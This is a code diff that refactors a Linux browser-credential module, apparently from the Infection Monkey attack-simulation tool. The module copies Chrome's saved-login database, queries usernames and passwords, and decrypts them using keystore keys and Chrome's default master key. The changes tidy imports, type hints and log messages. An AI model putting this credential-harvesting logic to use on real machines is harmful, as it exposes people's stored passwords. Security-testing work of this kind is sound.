@@ -1,11 +1,9 @@
-from typing import Collection
 import logging
 import os
 import shutil
 import sqlite3
 from itertools import chain
-from pathlib import Path, PurePath
-from typing import Iterator, Optional
+from typing import Collection, Iterator, Optional
 
 from common.credentials import Credentials, EmailAddress, Password, Username
 from common.types import Event
@@ -13,6 +11,7 @@ from infection_monkey.utils.threading import interruptible_iter
 
 from .browser_credentials_database_path import BrowserCredentialsDatabasePath
 from .decrypt import decrypt_AES, decrypt_v80
+from .linux_credentials_database_selector import DEFAULT_MASTER_KEY
 from .linux_keystore import get_decryption_keys_from_storage, hash_decryption_key
 
 
@@ -20,6 +19,7 @@ logger = logging.getLogger(__name__)
 
 AES_BLOCK_SIZE = 16
 AES_INIT_VECTOR = b" " * 16
+
 DB_TEMP_PATH = "/tmp/chrome.db"
 DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"
 
@@ -32,26 +32,33 @@ class LinuxCredentialsDatabaseProcessor:
         self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
     ) -> Collection[Credentials]:
         self._decryption_keys = [key for key in get_decryption_keys_from_storage()]
-        self._decryption_keys.append(hash_decryption_key("peanuts".encode()))
+        self._decryption_keys.append(hash_decryption_key(DEFAULT_MASTER_KEY))
         credentials = chain.from_iterable(map(self._process_database_path, database_paths))
         return list(interruptible_iter(credentials, interrupt))
 
-    def _process_database_path(self, database_path: PurePath) -> Iterator[Credentials]:
-        path = Path(database_path)
-        if path.is_file():
+    def _process_database_path(
+        self, database_path: BrowserCredentialsDatabasePath
+    ) -> Iterator[Credentials]:
+        if database_path.database_file_path.is_file():
             try:
-                shutil.copyfile(path, DB_TEMP_PATH)
+                shutil.copyfile(database_path.database_file_path, DB_TEMP_PATH)
 
                 conn = sqlite3.connect(DB_TEMP_PATH)
             except Exception:
-                logger.exception(f"Error encounter while connecting to database: {path}")
+                logger.exception(
+                    "Error encounter while connecting to "
+                    f"database: {database_path.database_file_path}"
+                )
                 os.remove(DB_TEMP_PATH)
                 return
 
             try:
                 yield from self._process_login_data(conn)
             except Exception:
-                logger.exception(f"Error encountered while processing database {database_path}")
+                logger.exception(
+                    "Error encountered while processing "
+                    f"database {database_path.database_file_path}"
+                )
             finally:
                 conn.close()
 
